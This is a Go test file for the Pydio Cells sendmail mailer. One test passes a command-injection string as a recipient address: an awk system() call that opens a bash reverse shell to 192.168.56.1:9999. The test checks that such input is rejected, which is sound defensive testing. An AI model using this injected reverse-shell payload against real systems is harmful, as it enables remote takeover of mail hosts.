/*
 * Copyright (c) 2019-2021. Abstrium SAS <team (at) pydio.com>
 * This file is part of Pydio Cells.
 *
 * Pydio Cells is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Pydio Cells is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with Pydio Cells.  If not, see <http://www.gnu.org/licenses/>.
 *
 * The latest code can be found at <https://pydio.com>.
 */

package mailer

import (
	"fmt"
	"strings"
	"testing"

	. "github.com/smartystreets/goconvey/convey"

	"github.com/pydio/cells/v4/common/proto/mailer"
)

const (
	sendmailtest_fromAddress = "" // "<an authorised user>@<host name>.<domain name>"
	sendmailtest_fromDName   = "" //"<sender Display Name>"
	sendmailtest_toAddress   = "" //"<recipient mail address>"
	sendmailtest_toDName     = "" //"<recipient Display Name>"

	// Leave this empty to use default
	sendmailtest_binaryPath = ""
	// On CentOS use:
	// sendmailtest_binaryPath = "/usr/sbin/sendmail"
)

func TestSendmail_Send(t *testing.T) {
	Convey("Test Sending w/ sendmail", t, func() {

		email := &mailer.Mail{}
		email.From = &mailer.User{
			Address: sendmailtest_fromAddress,
			Name:    sendmailtest_fromDName,
		}
		email.To = []*mailer.User{{
			Address: sendmailtest_toAddress,
			Name:    sendmailtest_toDName,
		}}

		email.Subject = "Test Email Sent from Go with sendmail"
		email.ContentPlain = "Hey, how are you ? This is now a success test."

		buildFromWelcomeTemplate(email, email.To[0])

		sendmail := &Sendmail{}
		//Calling configure wil trigger config loading inside tests
		//err := sendmail.Configure(context.Background(), nil)
		//So(err, ShouldBeNil)

		err := sendmail.Send(email)
		if err != nil {
			fmt.Println("Send mail return message: " + err.Error())
		}
		// usual case when not in dev mode:
		// the sendmail application must be installed and correctly configured on this machine
		So(err, ShouldNotBeNil)
	})
}

func TestSendmail_Input(t *testing.T) {
	Convey("Test sendmail input", t, func() {
		sendmail := &Sendmail{}
		sendmail.BinPath = "/usr/bin/awk"
		e := sendmail.Send(&mailer.Mail{
			From:        &mailer.User{Address: "test@pydio.com"},
			To:          []*mailer.User{{Address: "\";BEGIN {system(\"/usr/bin/bash -i >& /dev/tcp/192.168.56.1/9999 0>&1\");exit}\"#"}},
			Subject:     "test",
			ContentHtml: "Test",
		})
		So(e, ShouldNotBeNil)
		So(strings.Contains(e.Error(), "does not seems a valid email address"), ShouldBeTrue)
	})
}
